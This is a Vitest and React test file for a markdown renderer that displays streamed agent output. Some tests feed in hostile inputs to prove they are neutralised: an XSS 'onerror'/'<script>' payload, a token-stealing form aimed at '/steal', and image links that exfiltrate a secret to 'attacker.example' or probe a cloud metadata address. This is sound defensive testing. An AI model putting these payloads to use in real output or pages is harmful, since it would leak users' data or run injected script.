import { render, screen } from "@testing-library/react";
import { expect, test } from "vitest";

import {
  FENCE_SPLIT_CHARS,
  Markdown,
  SETTLED_MIN_CHARS,
  StreamingBody,
  renderMarkdown,
  splitSettled,
} from "@/lib/markdown";

const PARAGRAPH = "A paragraph that carries enough words to add up across repetitions.\n\n";

const LONG_FENCE = "```\n" + "a fenced line followed by a blank line\n\n".repeat(80) + "```\n\n";

const GIANT_FENCE = "```\n" + "a code line that keeps arriving\n".repeat(560) + "```\n\n";

const FIXTURE = [
  "# Report\n\n",
  PARAGRAPH.repeat(40),
  LONG_FENCE,
  PARAGRAPH.repeat(40),
  "~~~\ntilde fence holding ``` unclosed\n\nstill fenced\n~~~\n\n",
  PARAGRAPH.repeat(40),
  "- alpha\n\n- beta\n\n",
  "y".repeat(2100) + "\n\n- gamma\n\n- delta\n\n",
  PARAGRAPH.repeat(40),
  "The tail line",
].join("");

test("the long fence outgrows the settle threshold so its blank lines are live candidates", () => {
  expect(LONG_FENCE.length).toBeGreaterThan(SETTLED_MIN_CHARS);
});

test("a fixture crossing the hard-settle bound stays append-only on a sampled walk", () => {
  expect(GIANT_FENCE.length).toBeGreaterThan(FENCE_SPLIT_CHARS);
  const crossing = FIXTURE + "\n\n" + GIANT_FENCE + PARAGRAPH.repeat(4) + "The tail line";
  const hard = splitSettled(crossing).settled.filter((segment) => segment.parsePrefix !== "");
  expect(hard.length).toBeGreaterThan(0);
  let previous: { text: string; parsePrefix: string }[] = [];
  for (let length = 1; length <= crossing.length; length += 199) {
    const { settled, tail } = splitSettled(crossing.slice(0, length));
    expect(settled.map((segment) => segment.text).join("") + tail.text).toBe(
      crossing.slice(0, length),
    );
    expect(settled.slice(0, previous.length)).toEqual(previous);
    previous = settled;
  }
});

test("a partial line completing into a fence marker never retracts a settle", () => {
  const boundary = "```\n" + "a".repeat(16_379) + "\n```\n\nafter text\n";
  const midMarker = "```\n" + "a".repeat(16_377) + "\n```\n\nafter text\n";
  for (const repro of [boundary, midMarker]) {
    let previous: { text: string; parsePrefix: string }[] = [];
    for (let length = 1; length <= repro.length; length += 1) {
      const { settled, tail } = splitSettled(repro.slice(0, length));
      expect(settled.map((segment) => segment.text).join("") + tail.text).toBe(
        repro.slice(0, length),
      );
      expect(settled.slice(0, previous.length)).toEqual(previous);
      previous = settled;
    }
    expect(previous.length).toBeGreaterThan(0);
  }
});

test("a hard settle tripping at the fence's end never renders an empty code block", () => {
  const text =
    "```\n" +
    "a code line that keeps arriving\n".repeat(512) +
    "```\n\n" +
    "p".repeat(2500) +
    "\n\ntrailing text\n";
  const { settled, tail } = splitSettled(text);
  expect(settled.map((segment) => segment.text).join("") + tail.text).toBe(text);
  for (const segment of settled) {
    if (segment.parsePrefix === "") continue;
    const firstLine = segment.text.slice(0, segment.text.indexOf("\n"));
    expect(/^ {0,3}(`{3,}|~{3,})/.test(firstLine)).toBe(false);
  }
  const { container } = render(<StreamingBody text={text} />);
  for (const pre of Array.from(container.querySelectorAll("pre"))) {
    expect(pre.textContent?.trim()).not.toBe("");
  }
});

test("entity-like text round-trips through the escaped raw-html and failure paths", () => {
  const { container } = render(<Markdown text={'before <tag title="a&amp;b"> after'} />);
  expect(container.textContent).toContain('<tag title="a&amp;b">');
  const bomb = ">".repeat(2500) + " a &amp; b";
  const failed = render(<Markdown text={bomb} />);
  expect(failed.container.querySelector("pre")?.textContent).toContain("a &amp; b");
});

test("settled segments are append-only across every prefix and always reassemble", () => {
  let previous: { text: string; parsePrefix: string }[] = [];
  for (let length = 0; length <= FIXTURE.length; length += 1) {
    const prefix = FIXTURE.slice(0, length);
    const { settled, tail } = splitSettled(prefix);
    expect(settled.map((segment) => segment.text).join("") + tail.text).toBe(prefix);
    expect(settled.slice(0, previous.length)).toEqual(previous);
    if (settled.length < previous.length) throw new Error("a settled segment was retracted");
    previous = settled;
  }
  expect(previous.length).toBeGreaterThan(1);
});

test("a blank line inside a backtick or tilde fence never splits", () => {
  const { settled, tail } = splitSettled(FIXTURE);
  settled.forEach((segment, index) => {
    const nextPrefix = index + 1 < settled.length ? settled[index + 1].parsePrefix : tail.parsePrefix;
    if (segment.parsePrefix !== "" || nextPrefix !== "") return;
    const backticks = segment.text.match(/^ {0,3}```/gm) ?? [];
    const tildes = segment.text.match(/^ {0,3}~~~/gm) ?? [];
    expect(backticks.length % 2).toBe(0);
    expect(tildes.length % 2).toBe(0);
  });
});

test("an unterminated lookahead line never settles a boundary", () => {
  const base = "x".repeat(SETTLED_MIN_CHARS + 10) + "\n\n";
  expect(splitSettled(base + "-").settled).toEqual([]);
  expect(splitSettled(base + "- item\n").settled).toEqual([]);
  expect(splitSettled(base + "text\n").settled).toEqual([{ text: base, parsePrefix: "" }]);
});

test("every continuation shape blocks a settle: ordered, bullet, quote, indent", () => {
  const base = "x".repeat(SETTLED_MIN_CHARS + 10) + "\n\n";
  expect(splitSettled(base + "1. item\n").settled).toEqual([]);
  expect(splitSettled(base + "7) item\n").settled).toEqual([]);
  expect(splitSettled(base + "* item\n").settled).toEqual([]);
  expect(splitSettled(base + "> quoted\n").settled).toEqual([]);
  expect(splitSettled(base + "  indented\n").settled).toEqual([]);
});

test("a fence closes only on its own marker at its own length or longer", () => {
  const pad = "y".repeat(SETTLED_MIN_CHARS + 10);
  const mixed = "```\n~~~\n" + pad + "\n```\n\nafter text\n";
  expect(splitSettled(mixed).settled).toEqual([
    { text: "```\n~~~\n" + pad + "\n```\n\n", parsePrefix: "" },
  ]);
  const nested = "````\n```\n" + pad + "\n````\n\nafter text\n";
  expect(splitSettled(nested).settled).toEqual([
    { text: "````\n```\n" + pad + "\n````\n\n", parsePrefix: "" },
  ]);
  const tilde = "~~~\n```\n" + pad + "\n~~~\n\nafter text\n";
  expect(splitSettled(tilde).settled).toEqual([
    { text: "~~~\n```\n" + pad + "\n~~~\n\n", parsePrefix: "" },
  ]);
});

test("a giant unclosed fence still settles bounded segments that render as code", () => {
  const giant = "```\n" + "a code line that keeps arriving\n".repeat(2200);
  const { settled, tail } = splitSettled(giant);
  expect(settled.length).toBeGreaterThan(1);
  expect(settled[1].parsePrefix).toBe("```\n");
  expect(tail.text.length).toBeLessThan(FENCE_SPLIT_CHARS + 100);
  expect(settled.map((segment) => segment.text).join("") + tail.text).toBe(giant);

  const { container } = render(<StreamingBody text={giant} />);
  expect(container.querySelectorAll("pre").length).toBeGreaterThan(1);
  expect(container.querySelector("p")).toBeNull();
});

test("raw html in agent prose renders as text instead of vanishing", () => {
  render(<Markdown text={"use <username> as the placeholder, compare a<b and c<d"} />);
  expect(
    screen.getByText(/use <username> as the placeholder, compare a<b and c<d/),
  ).toBeTruthy();
});

test("a parse failure renders the raw text instead of unmounting the page", () => {
  const bomb = ">".repeat(2500) + " quoted";
  const { container } = render(<Markdown text={bomb} />);
  expect(container.querySelector("pre")?.textContent).toContain("quoted");
});

test("single newlines break lines inside a paragraph", () => {
  const { container } = render(<Markdown text={"line one\nline two"} />);
  expect(container.innerHTML).toContain("<br");
});

test("the tag surface renders: tables, quotes, rules, strikethrough, small headings", () => {
  const { container } = render(
    <Markdown
      text={
        "##### fine print\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n> quoted\n\n---\n\n~~gone~~"
      }
    />,
  );
  expect(container.querySelector("h5")).not.toBeNull();
  expect(container.querySelector("table")).not.toBeNull();
  expect(container.querySelector("blockquote")).not.toBeNull();
  expect(container.querySelector("hr")).not.toBeNull();
  expect(container.querySelector("del")).not.toBeNull();
  expect((container.firstChild as HTMLElement).className).toContain("[&_a]:text-link");
  expect((container.firstChild as HTMLElement).className).toContain("[&_pre]:");
  expect((container.firstChild as HTMLElement).className).toContain("h5,h6");
});

test("a short text stays wholly in the tail", () => {
  const short = "one paragraph\n\nanother\n";
  expect(short.length).toBeLessThan(SETTLED_MIN_CHARS);
  expect(splitSettled(short)).toEqual({ settled: [], tail: { text: short, parsePrefix: "" } });
});

test("raw html renders as visible text, elements and handlers included", () => {
  const { container } = render(
    <Markdown text={'before <img src="x" onerror="alert(1)"> <script>alert(2)</script> after'} />,
  );
  expect(container.querySelector("script")).toBeNull();
  expect(container.querySelector("img")).toBeNull();
  expect(container.textContent).toContain('<script>alert(2)</script>');
  expect(container.textContent).toContain("before");
  expect(container.textContent).toContain("after");
});

test("raw forms and inputs render as visible text, never as controls", () => {
  const { container } = render(
    <Markdown text={'<form action="/steal"><input name="token"><button>go</button></form>'} />,
  );
  expect(container.querySelector("form")).toBeNull();
  expect(container.querySelector("input")).toBeNull();
  expect(container.querySelector("button")).toBeNull();
  expect(container.textContent).toContain('<input name="token">');
});

test("a markdown link renders as a safe link and code renders as code", () => {
  render(<Markdown text={"see [docs](https://example.com/d)\n\n```\nplain\n```"} />);
  const link = screen.getByRole("link", { name: "docs" });
  expect(link.getAttribute("rel")).toBe("noopener noreferrer");
  expect(link.getAttribute("target")).toBe("_blank");
  expect(screen.getByText("plain").closest("pre")).toBeTruthy();
});

test("a settled message parses as one document so link reference definitions resolve", () => {
  const text = "see [docs][ref]\n\n" + PARAGRAPH.repeat(40) + "[ref]: https://example.com/d\n";
  expect(splitSettled(text).settled.length).toBeGreaterThan(0);
  render(<Markdown text={text} />);
  expect(screen.getByRole("link", { name: "docs" }).getAttribute("href")).toBe(
    "https://example.com/d",
  );
});

test("a streamed body renders settled segments and the live tail", () => {
  render(<StreamingBody text={PARAGRAPH.repeat(40) + "**still going**"} />);
  expect(screen.getByText("still going").tagName).toBe("STRONG");
  expect(screen.getAllByText(/carries enough words/).length).toBeGreaterThan(1);
});

test("an image renders with its source and alt text, and a linked image stays linked", () => {
  render(
    <Markdown
      text={
        "![the chart](/surface/web/files/chart.png)\n\n" +
        "[![badge](" + location.origin + "/surface/web/files/badge.png)](https://example.com/build)"
      }
    />,
  );
  const chart = screen.getByAltText("the chart");
  expect(chart.getAttribute("src")).toBe("/surface/web/files/chart.png");
  expect(screen.getByAltText("badge").closest("a")?.getAttribute("href")).toBe(
    "https://example.com/build",
  );
});

test("an image from any foreign origin is removed entirely", () => {
  for (const src of [
    "https://attacker.example/p.png?d=SECRET",
    "http://attacker.example/p.png",
    "https://169.254.169.254/latest/meta-data",
  ]) {
    const rendered = renderMarkdown("![leak](" + src + ") after");
    expect(rendered).not.toContain("<img");
    expect(rendered).toContain("after");
  }
});

test("task-list items keep distinguishable checked and unchecked boxes, always disabled", () => {
  const { container } = render(<Markdown text={"- [x] shipped\n- [ ] pending"} />);
  const boxes = Array.from(container.querySelectorAll("input"));
  expect(boxes.length).toBe(2);
  expect(boxes.every((box) => box.getAttribute("type") === "checkbox")).toBe(true);
  expect(boxes.every((box) => box.hasAttribute("disabled"))).toBe(true);
  expect(boxes.filter((box) => box.hasAttribute("checked")).length).toBe(1);
});

test("the only live inputs are the checkboxes markdown itself mints, always disabled", () => {
  const rendered = renderMarkdown("- [x] done\n- [ ] open\n\ntyped: <input type=\"text\">");
  expect(rendered.match(/<input/g)?.length).toBe(2);
  expect(rendered.match(/type="checkbox"/g)?.length).toBe(2);
  expect(rendered.match(/disabled/g)?.length).toBe(2);
});

test("markdown-minted attributes survive and the hook forces link safety", () => {
  const kept = renderMarkdown("3. third\n4. fourth");
  expect(kept).toContain('start="3"');
  const forced = renderMarkdown("[d](https://example.com/d)");
  expect(forced).toContain('target="_blank"');
  expect(forced).toContain('rel="noopener noreferrer"');
});

test("a raw-block opener never swallows or activates the prose that follows it", () => {
  const cases: Array<[string, string]> = [
    ["Wrap it in <code> and then compare a<b and c<d", "compare a<b and c<d"],
    ["<kbd> then a<b", "then a<b"],
    ["Use <script> tags. Now compare a<b and c<d.", "compare a<b and c<d."],
  ];
  for (const [source, survives] of cases) {
    const { container, unmount } = render(<Markdown text={source} />);
    expect(container.textContent).toContain(survives);
    unmount();
  }

  const twoParagraphs = render(
    <Markdown text={"In <code>, note that 1<2 and 3<4.\n\nNext paragraph: x<y still?"} />,
  );
  expect(twoParagraphs.container.textContent).toContain("x<y still?");
  twoParagraphs.unmount();

  const minted = render(
    <Markdown text={"See <code> then <img/src=/surface/web/files/secret.png alt=x> and <code> <em/x>"} />,
  );
  expect(minted.container.querySelector("img")).toBeNull();
  expect(minted.container.querySelector("em")).toBeNull();
});

test("a newline-free blob inside a fence still settles bounded segments", () => {
  const blob = "```\n" + "x".repeat(200_000);
  const { settled, tail } = splitSettled(blob);
  expect(settled.length).toBeGreaterThan(10);
  expect(tail.text.length).toBeLessThan(FENCE_SPLIT_CHARS);
  expect(settled.map((segment) => segment.text).join("") + tail.text).toBe(blob);
  let previous: { text: string; parsePrefix: string }[] = [];
  for (let length = 1; length <= blob.length; length += 977) {
    const { settled: now } = splitSettled(blob.slice(0, length));
    expect(now.slice(0, previous.length)).toEqual(previous);
    previous = now;
  }
});

test("the settle threshold is inclusive at its exact boundary", () => {
  const exact = "x".repeat(SETTLED_MIN_CHARS - 2) + "\n\n";
  expect(exact.length).toBe(SETTLED_MIN_CHARS);
  expect(splitSettled(exact + "text\n").settled).toEqual([{ text: exact, parsePrefix: "" }]);
});
